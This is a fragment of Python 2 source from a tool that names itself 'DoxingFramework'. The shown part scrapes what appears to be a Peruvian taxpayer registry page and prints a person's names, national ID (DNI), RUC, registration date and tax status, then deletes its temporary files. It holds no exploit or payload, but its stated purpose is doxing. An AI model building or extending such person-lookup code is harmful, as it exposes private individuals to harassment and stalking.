        DNI = str(soup.find_all("p", attrs={"class": "list-group-item-text"})[1]).replace('<p class="list-group-item-text">', '').replace('</p>','')[5:13]
        Fech_inscrip = str(soup.find_all("p", attrs={"class": "list-group-item-text"})[3]).replace('<p class="list-group-item-text">', '').replace('</p>','')

        _Estado = str(soup.find_all("p", attrs={"class": "list-group-item-text"})[4]).replace('<p class="list-group-item-text">','').replace('</p>', '').replace(' ', '')

        if 'ACTIVO' in _Estado: Estado = 'ACTIVO'
        elif 'TEMPORAL' in _Estado: Estado = 'SUSPENSION TEMPORAL'
        elif 'PROVISIONAL' in _Estado: Estado = 'BAJA PROVISIONAL'
        elif 'BAJA DEFINITIVA' in _Estado: Estado = 'BAJA DEFINITIVA'
        elif 'BAJA PROVISIONAL DE OFICIO' in _Estado:    Estado = 'BAJA PROVISIONAL DE OFICIO'
        elif 'BAJA DEFINITIVA DE OFICIO' in _Estado: Estado = 'BAJA DEFINITIVA DE OFICIO'

        _Condicion = str(soup.find_all("p", attrs={"class": "list-group-item-text"})[5]).replace('</p>','').replace('<p class="list-group-item-text">', '').replace(' ', '')

        if 'HABIDO' in _Condicion: Condicion = 'HABIDO'
        elif 'NO HALLADO' in _Condicion: Condicion = 'NO HALLADO'
        elif 'NO HABIDO' in _Condicion:  Condicion = 'NO HABIDO'

        print "\n"
        print Green + '\n[#]RUC/NOMBRES: '
        print Cyan + '       ' + Nombres + '\n'
        print Green + '[#]TIPO CONTRIBUYENTE: '
        print Cyan + '       ' + Contr + '\n'
        print Green + '[#]DNI: '
        print Cyan + '       ' + DNI + '\n'
        print Green + '[#]RUC: '
        print Cyan + '       ' + Ruc + '\n'
        print Green + '[#]FECHA DE INSCRIPCION: '
        print Cyan + '       ' + Fech_inscrip + '\n'
        print Green + '[#]ESTADO: '
        print Cyan + '       ' + Estado + '\n'
        print Green + '[#]CONDICION: '
        print Cyan + '       ' + Condicion + '\n'


        f.close()

        Command_exe_v1("del /F /Q tmp\doxfm\_recorte.png && del /F /Q tmp\doxfm\screenshot.png && del /F /Q tmp\doxfm\page.html", "rm tmp/doxfm/_recorte.png && rm tmp/doxfm/screenshot.png && rm tmp/doxfm/page.html")

    elif choice == "exit":
        time.sleep(1.0)
        print Yellow + '\n[/] Thanks for use' + Green + ' |DoxingFramework|' + White
        time.sleep(1.5)

        ClearS()

        exit(1)
        #DeleteCache()

    #elif choice == "update": Update()

    elif choice == "help":
        ClearS()
        Help()

    elif choice == "showm":
        ClearS()
        Menu()

    else: ClearS()
